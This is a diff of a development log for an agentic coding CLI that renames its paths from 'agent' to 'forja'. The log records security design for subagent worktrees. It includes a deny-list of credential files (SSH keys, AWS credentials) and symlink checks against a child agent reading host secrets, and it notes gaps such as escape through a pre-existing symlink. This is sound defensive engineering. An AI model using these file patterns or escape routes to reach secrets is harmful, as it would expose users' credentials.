 **Verification:** `bun test` 1364 pass / 10 skip / 0 fail (+2 new); `tsc --noEmit` clean; `biome check` clean.
 
@@ -33795,7 +35099,7 @@ the child gets `cwd`.
 - **D4 — Bun.Glob, no regex.** CLAUDE.md hard rule + spec uses globs natively. Two probes per pattern (literal + `**/`-prefixed) give any-depth semantics without inventing pattern syntax. The matcher's first-hit behavior means more-specific patterns can shadow less-specific ones (`id_rsa*` beats `.ssh/**` for `.ssh/id_rsa`); that's fine — both flag the file as sensitive.
 - **D5 — Sensitive *directory* detection via probe.** A `_probe` child path is matched against the deny-list; if any pattern hits, the whole directory is `rmSync` recursive. This handles `.ssh/**` cleanly while keeping `.aws/credentials` (file-level) from sweeping `.aws/` (which can ship legitimate non-sensitive content). The probe filename is unlikely to collide with any specific file pattern.
 - **D6 — `.git` always skipped.** In a linked worktree it's the gitlink file pointing at the admin dir; the parent repo owns admin state, never the validator. Skipping by name (not stat) is faster and tolerates the rare case where a fixture writes a `.git` directory.
-- **D7 — Override hierarchy DEFERRED.** Spec §8.4 lists four override layers (`/trust path`, playbook frontmatter, `agent.toml`, `~/.config/agent/security.toml`). Three of those depend on subsystems that don't exist yet (playbooks, agent.toml schema, global security config). The hardcoded canonical list is the safer floor; PRs that need overrides will land alongside the consuming subsystem (M5 playbooks for the playbook-level layer, M6 trust for `/trust path`).
+- **D7 — Override hierarchy DEFERRED.** Spec §8.4 lists four override layers (`/trust path`, playbook frontmatter, `agent.toml`, `~/.config/forja/security.toml`). Three of those depend on subsystems that don't exist yet (playbooks, agent.toml schema, global security config). The hardcoded canonical list is the safer floor; PRs that need overrides will land alongside the consuming subsystem (M5 playbooks for the playbook-level layer, M6 trust for `/trust path`).
 - **D8 (post-review) — Two-pass walker, NOT mixed pass.** Initial design walked the tree once, validating symlinks and deleting files in the same loop. Code review caught that `readdirSync` order made spawn nondeterministic when a repo committed both a deny-listed file (`.env`) AND a symlink pointing at it (`link -> .env`): if `.env` iterated first, deletion left the symlink dangling and `realpath` threw `symlink_unresolvable` on the next iteration; if the symlink came first, validation accepted and the run proceeded. Pass 1 now validates ALL symlinks against the boundary, pass 2 then deletes deny-listed files / sensitive directories. Symlinks that target soon-to-be-deleted files are accepted in pass 1 (target intact), then dangle after pass 2 — child can't follow ENOENT, security preserved, spawn deterministic. Same fix closes the symlink-into-sensitive-directory case (M1 from review).
 - **D9 (post-review) — Resolved target redacted from `symlink_escapes_worktree` message.** The message is the only text artifact that may flow into logs / audit / telemetry; the resolved target is the host-side secret path the symlink was trying to read, and embedding it would defeat the purpose of refusing to read the file. The operator gets the symlink path via `error.path` and can `readlink` it themselves for forensic investigation. Spec §6 redaction principle applied defensively even though the validator's caller doesn't currently log the message.
 
@@ -33815,7 +35119,7 @@ the child gets `cwd`.
 
 **Verification:** `bun test` 1362 pass / 10 skip / 0 fail (+43 new across matcher, walker, two-pass invariants, integration, and runtime activation); `tsc --noEmit` clean; `biome check` clean.
 
-**Next:** M3 / Step 4.2b.iv — `bgLogDir` per-worktree (lifts the `requiresBgManager` gate). Subagents currently can't run `bun run dev` or any background-managed tool; the gate refuses under any isolation because the bg log directory is global and would mix child output into operator workflows. Per-worktree `bg-logs/` directory + scoped manager closes the gap. After .iv, the 4.2b arc is done; 4.2c lands checkpoints inside worktrees and 4.2d ships `agent worktree gc` + merge helpers.
+**Next:** M3 / Step 4.2b.iv — `bgLogDir` per-worktree (lifts the `requiresBgManager` gate). Subagents currently can't run `bun run dev` or any background-managed tool; the gate refuses under any isolation because the bg log directory is global and would mix child output into operator workflows. Per-worktree `bg-logs/` directory + scoped manager closes the gap. After .iv, the 4.2b arc is done; 4.2c lands checkpoints inside worktrees and 4.2d ships `forja worktree gc` + merge helpers.
 
 ---
 
@@ -33891,7 +35195,7 @@ that gap.
   the edge case the wall-clock was designed for.
 - **Operator-facing CLI for stale detection.** `--list-sessions`
   doesn't expose `last_heartbeat` age. Out of scope; lands
-  with `agent worktree gc` in 4.2d when operator workflows
+  with `forja worktree gc` in 4.2d when operator workflows
   for stale subagents become a deliberate surface.
 - **Heartbeat history.** Single column means we have only
   the latest pulse. No detection of "child pulsed for a while
@@ -33911,7 +35215,7 @@ a child read host-level secrets. Static deny-list pattern set
 + runtime realpath validation closes the gap. After .iii, .iv
 (bgLogDir per-worktree, lifts `requiresBgManager` gate) finishes
 the 4.2b arc; then 4.2c (checkpoints inside worktree) and 4.2d
-(`agent worktree gc` + merge helpers) for operator surface.
+(`forja worktree gc` + merge helpers) for operator surface.
 
 ---
 
@@ -33924,7 +35228,7 @@ column + one engine getter) and the race window is real:
 between the parent's `bootstrap()` (which calls `resolvePolicy`
 + `createPermissionEngine`) and the child's startup (which used
 to call `resolvePolicy` again), a human edit to
-`.agent/permissions.yaml` (or any layer above) could run the
+`.forja/permissions.yaml` (or any layer above) could run the
 child under different rules than the parent had validated.
 Worst case: a tool the parent confirmed was allowed surfaces
 as denied (or vice versa) inside the same logical run.
@@ -34260,7 +35564,7 @@ in Pending.
 **Pending (deferred — not blocking, recorded for visibility):**
 
 - **M2 — policy drift between parent spawn and child read.**
-  Child re-resolves `.agent/permissions.yaml` etc. on its own
+  Child re-resolves `.forja/permissions.yaml` etc. on its own
   startup; if the file changed between spawn and child read,
   the child runs under a different policy than the parent
   expected. Race window is hundreds of ms in practice. Fix
@@ -34461,7 +35765,7 @@ worktree → run child with `cwd=worktree-root` → cleanup → audit.
 
 **Decisions:**
 
-- **Worktree root: `~/.cache/agent/worktrees/<id>/` with chmod 0700, NOT `/tmp`.** Per SECURITY_GUIDELINE §8.4: `/tmp` on shared systems opens symlink-traversal exposure and tmpfs eats the worktree on reboot while a paused subagent might still want to be inspected. XDG-aware lookup (`$XDG_CACHE_HOME` → `~/.cache`); empty-string XDG var treated as unset (common shell oddity). The chmod is applied even to a pre-existing root so a looser parent install can't downgrade the protection.
+- **Worktree root: `~/.cache/forja/worktrees/<id>/` with chmod 0700, NOT `/tmp`.** Per SECURITY_GUIDELINE §8.4: `/tmp` on shared systems opens symlink-traversal exposure and tmpfs eats the worktree on reboot while a paused subagent might still want to be inspected. XDG-aware lookup (`$XDG_CACHE_HOME` → `~/.cache`); empty-string XDG var treated as unset (common shell oddity). The chmod is applied even to a pre-existing root so a looser parent install can't downgrade the protection.
 - **Worktree id ≠ session id.** I considered preassigning a session id so the worktree path matched `/<session-id>/`, but that required reaching into `runAgent`'s session-creation flow (a non-trivial refactor for a cosmetic correlation). The audit table stores both `session_id` and `path` — operators correlate via SQL, not by reading directory names. Keeping the worktree id as a fresh UUID independent of the session is the smaller change.
 - **Single post-cleanup audit INSERT (not insert-then-update).** The FK on `subagent_worktrees.session_id → sessions(id)` requires the child session to exist, and that happens INSIDE `runAgent`. Pre-creation insertion is impossible without restructuring the harness; intermediate `active` state matters only when 4.2b adds subprocess heartbeats. For in-process synchronous execution the row lands once, with the resolved status. The CHECK accepts 'active' anyway so 4.2b can extend without a constraint rewrite.
 - **`reason` widened to `ExitReason | 'worktree_create_failed'` instead of adding a new `kind` to `SpawnSubagentResult`.** Adding a `spawn_failed` discriminator would have rippled through tools/types.ts, harness/loop.ts, task.ts and their tests for one new code path. Reusing the existing `ran` kind with `status='error'` and a custom reason is honest: the calling tool already maps non-`done` to `subagent.run_failed`, and the worktree-create failure is exactly that — a run that didn't happen because spawn failed. New kind reconsidered when 4.2b's subprocess path produces additional pre-run failure modes.
@@ -34469,15 +35773,15 @@ worktree → run child with `cwd=worktree-root` → cleanup → audit.
 - **Cleanup policy: clean tree → remove (`worktree remove --force` + `branch -D`); dirty tree → preserve.** `git status --porcelain` empty means the child made no tracked or untracked diff — there's nothing to keep. `--force` because ignored files git would call "would be lost" don't survive the same bar (the cleanup contract is "no observable diff → drop"). Branch delete is best-effort; failures are diagnostic, not outcome-affecting.
 - **No symlink validation, no copy-with-deny-list, no commit-on-done.** All three are real SECURITY §8.4 / FAILURE_MODES §7.2 features the spec mandates, but they belong in 4.2b (subprocess + sandbox surface) and 4.2d (commit lifecycle). Pulling them forward here would block the slice on subprocess design that hasn't happened yet.
 - **`writes:true` gate stays unconditional in load + validate + runtime when isolation is 'none'.** Defense in depth: a programmatic caller building a `SubagentDefinition` directly (evals, future tooling) without going through the loader still gets protected by the runtime's `buildChildRegistry`. Any tool that opts into `metadata.writes=true` inherits the refusal automatically — no name list to keep updated.
-- **Checkpoints stay OFF for worktree subagents in 4.2a.** Re-enabling them needs `refs/agent/checkpoints/<child-session>` to live inside the worktree's branch namespace without leaking into the parent's `--undo` walk. That's a non-trivial reasoning task best done in 4.2c with isolated tests; keeping them off here makes 4.2a an honest "writes are now possible, reversibility lands separately" slice instead of trying to do both at once.
+- **Checkpoints stay OFF for worktree subagents in 4.2a.** Re-enabling them needs `refs/forja/checkpoints/<child-session>` to live inside the worktree's branch namespace without leaking into the parent's `--undo` walk. That's a non-trivial reasoning task best done in 4.2c with isolated tests; keeping them off here makes 4.2a an honest "writes are now possible, reversibility lands separately" slice instead of trying to do both at once.
 
 **What this DOESN'T close (deferred):**
 
 - **No subprocess.** Spec §11:1030 says "processo separado, comunicação via SQLite". 4.2a runs the child in-process — same Bun process, same DB handle, same harness invariants. Subprocess + IPC + heartbeat is 4.2b. The cost: a child that crashes hard (uncaught throw escapes the harness's top-level catch — currently exhaustive, but a future regression could lose this) takes the parent down with it. In-process is the right pragmatic default while subprocess design is being shaped.
-- **No checkpoint chain.** A writing subagent's mutations land on the worktree's branch but are not snapshotted step-by-step under `refs/agent/checkpoints/<child>`. If the child writes a file then writes-and-corrupts it, the only reverse path is `git checkout` on the worktree branch — coarser-grained than the parent's per-step undo. 4.2c re-enables checkpoints inside the worktree.
-- **No `agent worktree gc` CLI verb.** A preserved worktree shows up in `listActiveSubagentWorktrees(db)` and on disk under `~/.cache/agent/worktrees/`, but the operator command to enumerate + clean orphans is 4.2d. Until then, manual `git worktree remove` + `rm -rf <path>` is the recovery path.
+- **No checkpoint chain.** A writing subagent's mutations land on the worktree's branch but are not snapshotted step-by-step under `refs/forja/checkpoints/<child>`. If the child writes a file then writes-and-corrupts it, the only reverse path is `git checkout` on the worktree branch — coarser-grained than the parent's per-step undo. 4.2c re-enables checkpoints inside the worktree.
+- **No `forja worktree gc` CLI verb.** A preserved worktree shows up in `listActiveSubagentWorktrees(db)` and on disk under `~/.cache/forja/worktrees/`, but the operator command to enumerate + clean orphans is 4.2d. Until then, manual `git worktree remove` + `rm -rf <path>` is the recovery path.
 - **No symlink hardening.** A `.gitignore`'d symlink inside the parent that points outside the repo gets carried into the worktree by `git worktree add` (it's a checkout of the same commit). 4.2a does NOT validate symlink targets at runtime; a writing subagent could escape via a pre-existing symlink. SECURITY_GUIDELINE §8.4 requires the deny-list copy + symlink validation; that lands in 4.2b together with the subprocess sandbox.
-- **No merge / commit / PR helper.** Spec §11.2:1066 lists "Pai decide: merge, descarta, ou abre PR". 4.2a returns `path` + `branch` in the envelope; the model reads them and decides via plain bash. Convenience CLI (`agent worktree merge <id>`) and slash commands (`/diff`, `/merge`) wait for M4's TUI work.
+- **No merge / commit / PR helper.** Spec §11.2:1066 lists "Pai decide: merge, descarta, ou abre PR". 4.2a returns `path` + `branch` in the envelope; the model reads them and decides via plain bash. Convenience CLI (`forja worktree merge <id>`) and slash commands (`/diff`, `/merge`) wait for M4's TUI work.
 - **No `commit_on_done` frontmatter.** The spec mentions it for FAILURE_MODES §7.2 conflict semantics; 4.2a doesn't surface it. Default is "never auto-commit" — the parent always inspects the dirty tree on its own.
 - **No `bgLogDir` for worktree subagents.** A child that wants `bash_background` inside the worktree still hits the "no bgLogDir" tool-error. Wiring a per-worktree bg dir is mechanical but pulled into 4.2b alongside the subprocess work where bg-process lifetime semantics need a second pass.
 - **No N+1 fix for the audit lookup in `--list-sessions --include-subagents`.** Each subagent row triggers a `getSubagentWorktree` SELECT on top of the existing `getSubagentRun` SELECT (when 4.2d wires it into the listing). Same shape as the prior O1 N+1 note from Step 4.1 — defer until first user reports a slow listing on > 100 subagent rows.
@@ -34531,8 +35835,8 @@ worktree → run child with `cwd=worktree-root` → cleanup → audit.
   child session to exist). A SIGKILL anywhere between
   createWorktree and the post-runAgent audit insert leaves a
   worktree on disk that `listOnDiskSubagentWorktrees(db)`
-  cannot find. `agent worktree gc` (4.2d) MUST do a filesystem
-  walk under `~/.cache/agent/worktrees/` cross-referenced with
+  cannot find. `forja worktree gc` (4.2d) MUST do a filesystem
+  walk under `~/.cache/forja/worktrees/` cross-referenced with
   `git worktree list --porcelain` rather than relying on the
   audit table alone. 4.2b's subprocess work moves the audit row
   insertion forward (write-only IPC happens before the child
@@ -34552,7 +35856,7 @@ worktree → run child with `cwd=worktree-root` → cleanup → audit.
   (C1 defense)` test. Drops `messages` to force runAgent into
   status='error'; asserts the worktree dir is gone after.
 - **M7 (deferred) — `parentCwd` semantics inside another
-  worktree are unvalidated.** A user invoking `agent` from an
+  worktree are unvalidated.** A user invoking `forja` from an
   already-checked-out git worktree (not the main repo) would
   thread that as `parentCwd`. `git worktree add -C <parentCwd>`
   resolves through `.git/worktrees/<id>/gitdir` to the main
@@ -34580,7 +35884,7 @@ the slice contract — both are out-of-scope for the in-process
 tests, 1 C1-defense test, 1 symlink-skip placeholder); `tsc
 --noEmit` clean; `biome check` clean.
 
-**Next:** M3 / Step 4.2b — subprocess + IPC via SQLite (write-only child) + heartbeat-driven timeout + symlink hardening. Justifies the subprocess spawn cost the in-process path side-stepped here, and unlocks the security model SECURITY_GUIDELINE §8.4 expects. Step 4.2c (checkpoint chain inside worktree) and 4.2d (`agent worktree gc` + merge helpers) follow.
+**Next:** M3 / Step 4.2b — subprocess + IPC via SQLite (write-only child) + heartbeat-driven timeout + symlink hardening. Justifies the subprocess spawn cost the in-process path side-stepped here, and unlocks the security model SECURITY_GUIDELINE §8.4 expects. Step 4.2c (checkpoint chain inside worktree) and 4.2d (`forja worktree gc` + merge helpers) follow.
 
 ---
 
@@ -34590,7 +35894,7 @@ Architectural review surfaced a real audit gap that wasn't in the
 prior O1/O2/O3/O4 list: the system prompt and toolset under which
 a subagent ran were never persisted. They lived in `.md` files on
 disk, loaded once at bootstrap; if an author edited
-`~/.config/agent/agents/explore.md` after a child run, the original
+`~/.config/forja/playbooks/explore.md` after a child run, the original
 definition was unrecoverable and "explain past behavior" forensics
 became impossible. The cost is asymmetric — every day deferred
 loses evidence on every production run that happens in the
@@ -34819,8 +36123,8 @@ land in **Pending** below for explicit deferral.
   write_file lands as `denied` in tool_calls).
 - **C3 — `subagents.shadows` computed but never surfaced.**
   Bootstrap returned the shadow list; `cli/run.ts` ignored it.
-  Authors editing `~/.config/agent/agents/foo.md` while a
-  project-scope `.agent/agents/foo.md` exists got the project
+  Authors editing `~/.config/forja/playbooks/foo.md` while a
+  project-scope `.forja/playbooks/foo.md` exists got the project
   version silently — no diagnostic. Fix: one warning per shadow
   on stderr, gated on non-`--json` (preserve stdout purity).
   Tests in `tests/cli/run.test.ts` cover both cases (warning
@@ -34968,7 +36272,7 @@ its own session row linked back to the parent via the new
 
 - **In-process, NOT subprocess.** Spec §11 mentions "processo separado, comunicação via SQLite". For Step 4.1 we run the child in the same Bun process: it spawns a fresh session id with `parent_session_id` set, runs the same `runAgent` loop with a filtered registry / restricted prompt / restricted budget, and writes to the same SQLite db. Subprocess isolation is genuinely useful when the child needs filesystem isolation (writing subagents) — at which point worktree isolation IS the answer (Step 4.2). Keeping 4.1 in-process avoids paying the spawn cost (~50-200ms) for the dominant read-only case AND reuses every existing harness invariant (abort-signal propagation, todo store, bg manager, telemetry) without reinventing IPC.
 - **Cost rollup is query-time, not write-time.** I proposed write-time rollup ("parent's `total_cost_usd` = self + children") in the design discussion; on implementation I reverted. Write-time rollup double-counts under resume + repeat task() calls, complicates the budget contract (no cost cap exists in `RunBudget` today anyway), and forces every cost-mutation path through both rows. The honest model: each session row tracks its own spend; `listChildSessions` walks the tree at query time. When a cost cap lands in `RunBudget` later, we revisit by building a parent-time getter that sums on demand.
-- **Checkpoints OFF for in-process subagents.** A child writing in the parent's tree under its own `refs/agent/checkpoints/<child-session>` chain isn't reachable from the parent's `--undo`. Disabling checkpoints for the child avoids creating refs that nobody can find. Read-only subagents (the dominant case) lose nothing. Writing subagents are the §11.2 worktree job — Step 4.2 re-enables checkpoints there because the worktree gives the child its own tree to checkpoint independently.
+- **Checkpoints OFF for in-process subagents.** A child writing in the parent's tree under its own `refs/forja/checkpoints/<child-session>` chain isn't reachable from the parent's `--undo`. Disabling checkpoints for the child avoids creating refs that nobody can find. Read-only subagents (the dominant case) lose nothing. Writing subagents are the §11.2 worktree job — Step 4.2 re-enables checkpoints there because the worktree gives the child its own tree to checkpoint independently.
 - **Whitelist filters at registry build time, not at execution.** `runSubagent` builds a fresh `ToolRegistry` containing only the named tools; the harness's existing `tool not registered` path rejects unknown names. Cleaner than a per-call gate and reuses the existing handling for typo'd tool names. Typos in the whitelist itself THROW at runtime (caller bug, not subagent runtime state) so the author finds them at first use.
 - **`spawnSubagent` lives on `ToolContext`, not as a new harness primitive.** The closure is built once per step and threaded into ctx the same way `bgManager` and `todoStore` are. Tests inject a mock predicate via `makeCtx({ spawnSubagent })`; the harness wires the real one when `config.subagentRegistry` is present. Keeps the tool surface uniform and avoids leaking provider/db/registry references into tools that don't need them.
 - **`unknown_subagent` is a discriminated result, not a throw.** The model can typo a name; that's a tool error the model recovers from (`subagent.unknown` with `available: [...]` in details). Programmer errors (registry missing entirely, typo in the playbook's tool whitelist) DO throw because they signal misconfiguration the model can't fix.
@@ -35029,7 +36333,7 @@ agent edit produces.
 
 **Fix:** detect unborn HEAD before stashing. When found, build a
 preservation commit with the same temp-index/commit-tree mechanism
-`snapshot()` uses, anchor it under `refs/agent/restore-saved/<ms>`,
+`snapshot()` uses, anchor it under `refs/forja/restore-saved/<ms>`,
 and report the ref to the caller via the new `stashKind:
 'agent-ref' | 'git-stash'` field on `RestoreResult`. The CLI
 renders the right recovery hint:
@@ -35089,7 +36393,7 @@ gate later (cost: $0, no API).
 
 `evals/smoke-checkpoint-undo.sh` mirrors the smoke-resume pattern:
 - mktemp workspace, isolated XDG, fresh `git init`
-- bypass-mode `.agent/permissions.yaml` so write_file isn't policy-denied
+- bypass-mode `.forja/permissions.yaml` so write_file isn't policy-denied
 - 3 seed files, sha-256-captured pre-edit
 - agent prompt asking Claude Haiku to prepend a header line to all
   three via write_file
@@ -35122,7 +36426,7 @@ The bug above is exactly the class of failure that mocks miss —
 not a logic error in the checkpoint subsystem itself, but a
 glue-layer mismatch between the CLI entry and the verb
 dispatcher. Without the smoke, this would have shipped to a real
-user as "agent --undo X gives me the help text". Worth the
+user as "forja --undo X gives me the help text". Worth the
 ~$0.01 tax to catch upfront.
 
 **Step 3 status:** all 8 acceptance criteria of CHECKPOINTS §5
@@ -35177,7 +36481,7 @@ race-on-shutdown, and a metadata-driven escapesCwd flag.
   to the checkpoint tree, leaving HEAD pointing past it. The
   user's `git status` then showed the diff between HEAD and the
   ckpt as "staged for commit" — confusing UX when they had their
-  own commits during the agent run. Fix: after the reset, run
+  own commits during the forja run. Fix: after the reset, run
   `read-tree HEAD` (no -u) to re-sync the index. Status reads as
   the natural "unstaged changes vs HEAD" (or clean, when HEAD ==
   ckpt-tree). Test asserts `git status --porcelain` shows only
@@ -35223,7 +36527,7 @@ race-on-shutdown, and a metadata-driven escapesCwd flag.
   surface raw git output (`fatal: bad object` /
   `Needed a single revision`). Rewrites detected via substring
   match into "this checkpoint references commit X which is no
-  longer reachable; run `agent --checkpoints purge <session>` to
+  longer reachable; run `forja --checkpoints purge <session>` to
   drop the stale rows." Test seeds an unreachable sha and
   asserts the hint is on stderr.
 
@@ -35263,7 +36567,7 @@ produces a git-backed snapshot that `--undo` (or
 
 **Decisions:**
 
-- **Ref shape: linear chain per session under `refs/agent/checkpoints/<session>`.** Each new snapshot's parent is the prior session checkpoint (or HEAD on the first), so the whole history stays reachable from one ref. We update the ref only on a successful new commit; the prior chain stays intact via parent links, and the DB row is the authoritative pointer when we need to walk back. NOT `refs/stash` — would pollute the user's stash list and is one-stack-only.
+- **Ref shape: linear chain per session under `refs/forja/checkpoints/<session>`.** Each new snapshot's parent is the prior session checkpoint (or HEAD on the first), so the whole history stays reachable from one ref. We update the ref only on a successful new commit; the prior chain stays intact via parent links, and the DB row is the authoritative pointer when we need to walk back. NOT `refs/stash` — would pollute the user's stash list and is one-stack-only.
 - **Snapshot via temp index + `commit-tree`, NOT `git stash create`.** stash-create can't pick parents (always HEAD). Our chain shape requires parent-on-prior-checkpoint, so we use the lower primitive: `GIT_INDEX_FILE=tmp git read-tree HEAD; git add -A; git write-tree; commit-tree <tree> -p <prior>`. The user's `.git/index` is never touched.
 - **No-op skip uses tree-equality vs prior parent.** When the working tree's `write-tree` matches the prior chain head's tree, we return `sha=null` and the harness writes no row. Defense in depth: a tool that lies about `writes:true` won't pollute the audit trail.
 - **`had_bash` derived by tool name, not metadata.** The bash family (`bash`, `bash_background`, `bash_kill`) is the only group whose side effects escape cwd reversibility (DB writes, network, processes). Hardcoding by name keeps the rule auditable; adding a new bash-shaped tool is an explicit edit, not an emergent metadata interaction.
@@ -35295,7 +36599,7 @@ produces a git-backed snapshot that `--undo` (or
 ## [2026-04-29] M3 / Step 2.4 — Resume + list-sessions (CLI)
 
 Lands the non-UI half of spec §2.1 session continuity:
-`agent --list-sessions` and `agent --resume <id|last>`. The
+`forja --list-sessions` and `forja --resume <id|last>`. The
 interactive picker (bare `--resume`, `/sessions *` slash
 commands, mini-recap inline) waits for the M4 Ink TUI.
 
@@ -36884,7 +38188,7 @@ storage table that persists process state across turns.
 |---|---|---|
 | Migration `005-background-processes` | NEW | Table per spec §13 model. Indices on (session_id, status) |
 | `bgProcessRepo` | NEW | Typed CRUD; `cleanup(sessionId)` marks running rows killed |
-| Process manager | NEW | `src/bg/manager.ts`. Wraps `Bun.spawn`, log files in `.agent/bg/<id>.{stdout,stderr}.log`, exit-event → DB update, kill = SIGTERM → 5s grace → SIGKILL |
+| Process manager | NEW | `src/bg/manager.ts`. Wraps `Bun.spawn`, log files in `.forja/bg/<id>.{stdout,stderr}.log`, exit-event → DB update, kill = SIGTERM → 5s grace → SIGKILL |
 | Tool `bash_background` | NEW | category=`bash`, writes=true. Returns `{ process_id, label, spawned_at }` |
 | Tool `bash_output` | NEW | category=`bash` (read-side; pessimistic), idempotent for fixed cursor. Cap N KB per call |
 | Tool `bash_kill` | NEW | category=`bash`. Idempotent on already-exited |
@@ -36940,7 +38244,7 @@ storage table that persists process state across turns.
   regression — the spawn was approved; reading
   stdout from an already-spawned process doesn't open
   new attack surface.
-- **Log file path is in `.agent/bg/`.** Same prefix as
+- **Log file path is in `.forja/bg/`.** Same prefix as
   the SQLite DB. Auto-created on first spawn.
   Cleanup: rotate by session_id at session start (or
   delete on `cleanup` call). 2.1 keeps the simplest
@@ -36960,7 +38264,7 @@ slice.
 - **Zombie processes on hard crash.** `process.on('exit')`
   is best-effort — `kill -9` to the harness leaves bg
   processes orphaned. Mitigation: store `os_pid` in
-  DB so a future `agent doctor` (M4 spec §18) can
+  DB so a future `forja doctor` (M4 spec §18) can
   detect and kill. Today: documented gap. Operators
   who run with autonomous agents over flaky
   connections should expect to occasionally clean up
@@ -36972,10 +38276,10 @@ slice.
   files after session end so operators can do
   post-mortem inspection (a `npm run dev` that
   crashed yesterday is exactly the kind of thing
-  someone wants to read tomorrow). Trade: `.agent/bg/`
+  someone wants to read tomorrow). Trade: `.forja/bg/`
   accumulates ~2 files per spawn forever. Pull-in
   signals to add gc:
-    - `agent doctor` lands (M4) — natural place to
+    - `forja doctor` lands (M4) — natural place to
       run `forja bg gc --older-than=7d`.
     - Slash commands land — `/bg cleanup` per spec.
     - A real workflow saturates disk before either —
@@ -37048,7 +38352,7 @@ slice.
   swallowed so the run's `HarnessResult` stays clean,
   and DB convergence via `markRunningAsKilled` ensures
   no zombie audit rows even if OS kills failed.
-- CLI bootstrap auto-sets `bgLogDir = <cwd>/.agent/bg`
+- CLI bootstrap auto-sets `bgLogDir = <cwd>/.forja/bg`
   per spec §2.7 — bg works end-to-end via `forja run`
   without operator config.
 - 51 unit tests across the subsystem: 14 (repo) +
@@ -37686,7 +38990,7 @@ implementation).
 Continues M3 / Step 1.1 with batch 2 — 10 cases that
 exercise the permission engine surface (`src/permissions/
 engine.ts`). Each case ships its own
-`.agent/permissions.yaml` via `setup.files`, which the eval
+`.forja/permissions.yaml` via `setup.files`, which the eval
 executor wires up automatically (`src/evals/executor.ts`
 drops a default `bypass` policy only when the case+fixture
 didn't provide one — see lines 108-115).
@@ -37738,7 +39042,7 @@ didn't provide one — see lines 108-115).
 - **No hierarchy cases (enterprise / user / project /
   session).** `src/permissions/hierarchy.ts` resolves
   layered policies, but eval cases ship a single
-  `.agent/permissions.yaml` (the project layer). Real
+  `.forja/permissions.yaml` (the project layer). Real
   hierarchy testing needs multi-file fixtures and
   potentially HOME/XDG override surfaces — out of
   scope for batch 2, comes back when subagents start
@@ -37766,7 +39070,7 @@ didn't provide one — see lines 108-115).
   pinning the documented behavior so any future
   refactor that loosens it lights up red.
 - **Loader-level guarantees re-validated implicitly.**
-  Each `.agent/permissions.yaml` shipped via
+  Each `.forja/permissions.yaml` shipped via
   `setup.files` round-trips through
   `loadPolicyFromFile` at engine construction. A
   YAML key typo (`allow_path` singular) would crash
@@ -37837,7 +39141,7 @@ edge cases the smoke tier intentionally skips.
 - 1.1 — scaffold + tool-depth batch (~12-15 cases). This
   entry.
 - 1.2 — permission engine cases (deny/allow/ask hierarchy
-  edges, `.agent/permissions.yaml` glob matching, prefix
+  edges, `.forja/permissions.yaml` glob matching, prefix
   rules).
 - 1.3 — compaction + plan mode edge cases (preserve-tail
   boundaries, fallback strategy when LLM call fails,
@@ -37963,7 +39267,7 @@ edge cases the smoke tier intentionally skips.
 **Pending (Step 1.2 onward):**
 
 - Permission engine cases (deny/allow/ask hierarchy
-  edges, `.agent/permissions.yaml` glob matching).
+  edges, `.forja/permissions.yaml` glob matching).
 - Compaction + plan mode edge cases.
 - Provider adapter parity matrix (waits on Gemini smoke
   unblock — see `docs/TODO.md`).
@@ -38626,7 +39930,7 @@ p50 < $0.20/task`; the harness is what measures it.
   exit_reason values validated against fixed unions.
 - `src/evals/executor.ts` — `executeCase`:
   1. mkdtemp → copy `setup.fixture` → write `setup.files` →
-     drop a default `.agent/permissions.yaml` with
+     drop a default `.forja/permissions.yaml` with
      `defaults.mode: bypass` if neither layer supplied one (evals
      run autonomously, no operator to confirm; plan-mode block
      stays at the harness layer regardless).
@@ -38677,7 +39981,7 @@ p50 < $0.20/task`; the harness is what measures it.
   default-deny path. `acceptEdits` still default-denies unmatched
   paths — needs explicit allow rules per case. `bypass` is the
   right semantic for a smoke run; cases that want stricter
-  policy drop their own `.agent/permissions.yaml` via setup.
+  policy drop their own `.forja/permissions.yaml` via setup.
   Plan mode stays orthogonal — it's a harness-layer block,
   unaffected by `bypass`.
 - **8 expectation kinds, not the spec's `tests_pass`/
@@ -38847,7 +40151,7 @@ proceed through the normal allow path.
 - Plan → run reentry with structured goal injection — M3.
 - Schema-validated YAML output (`spec §5.1` formal schema) — M5
   (constrained generation backend).
-- Plan-as-artifact persistence (`.agent/plans/<timestamp>.md`) —
+- Plan-as-artifact persistence (`.forja/plans/<timestamp>.md`) —
   deferred; current model output goes to stdout, captured if user
   redirects.
 - `acceptEdits` profile (third profile in §5.1) — separate step.
@@ -38867,7 +40171,7 @@ Without it the rest of M2 is asserted-to-work without proof.
 ## [2026-04-28] M2 / Step 4 — Permission hierarchy
 
 `AGENTIC_CLI §8` requires layered policy resolution: enterprise →
-user → project → session. M1 only loaded `./.agent/permissions.yaml`,
+user → project → session. M1 only loaded `./.forja/permissions.yaml`,
 leaving the higher and lower precedence tiers stubbed. Step 4 closes
 that gap; trust prompt (the other half of M2 step 4 in the spec) is
 deferred to `docs/TODO.md` because it depends on interactive UI that
@@ -38875,10 +40179,10 @@ hasn't landed yet.
 
 **Done:**
 - `src/permissions/paths.ts` — path discovery for each layer.
-  `ENTERPRISE_POLICY_PATH = /etc/agent/permissions.yaml`. User path
+  `ENTERPRISE_POLICY_PATH = /etc/forja/permissions.yaml`. User path
   honors `XDG_CONFIG_HOME` (with empty-string fallback to
-  `~/.config/agent/permissions.yaml`). Project path stays
-  `cwd/.agent/permissions.yaml`.
+  `~/.config/forja/permissions.yaml`). Project path stays
+  `cwd/.forja/permissions.yaml`.
 - `src/permissions/hierarchy.ts` — `resolvePolicy({cwd, ...})` walks
   the four layers, loads each that exists, merges with locked-section
   semantics. Returns the effective `Policy`, the loaded
@@ -38925,7 +40229,7 @@ hasn't landed yet.
 - `tests/cli/bootstrap.test.ts` — updated to use `policyLayers`
   instead of removed `policySource` field; `enterprisePolicyPath: null`
   + `userPolicyPath: null` test seams pin that the test suite never
-  touches `/etc/agent` or `~/.config/agent` during run.
+  touches `/etc/forja` or `~/.config/forja` during run.
 - Total suite: **512 pass / 7 skip / 1132 expect() calls** in ~1.5s.
 
 **Decisions:**
@@ -38933,7 +40237,7 @@ hasn't landed yet.
   than relying on `existsSync` returning false. Tests that don't
   actively use a layer set the path to `null` so the layer is
   guaranteed not to be probed. Catches the class of test bugs where
-  a CI runner happens to have `/etc/agent/permissions.yaml` and the
+  a CI runner happens to have `/etc/forja/permissions.yaml` and the
   test silently picks it up.
 - **`Policy` type ships `locked` as part of the schema**, not as a
   separate per-layer flag map. Round-trips through YAML; admins can
@@ -38964,7 +40268,7 @@ hasn't landed yet.
   is a later step.
 - Windows path discovery (`%PROGRAMDATA%`, `%APPDATA%`). Linux/Mac
   only in M1/M2; same posture as `src/storage/paths.ts`.
